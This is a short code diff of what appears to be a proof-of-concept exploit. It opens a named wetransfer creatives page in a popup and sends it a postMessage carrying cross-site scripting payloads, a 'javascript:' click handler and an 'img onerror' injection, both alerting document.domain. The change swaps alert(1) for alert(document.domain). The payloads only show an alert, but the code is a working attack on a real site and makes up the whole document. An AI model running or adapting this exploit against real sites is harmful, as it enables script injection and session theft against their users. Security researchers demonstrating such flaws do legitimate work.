@@ -11,14 +11,13 @@
     const url = "https://creatives.wetransfer.net/creator/wepresent/2403-photographersguide/parallax/1_nf79Rp/index.html?_origin=https://daemoon.me"; 
     let popup;
 
-
     document.getElementById("send").addEventListener("click", () => {
       popup = window.open(url);
       setTimeout(() => {
         popup.postMessage(JSON.stringify({
             command: "start",
             data: [{
-            _click: "javascript:alert(1)",
+            _click: "javascript:alert(document.domain)",
             _analytics: ["<img src=x onerror=alert(document.domain)>"]
             }]
         }), "*" );
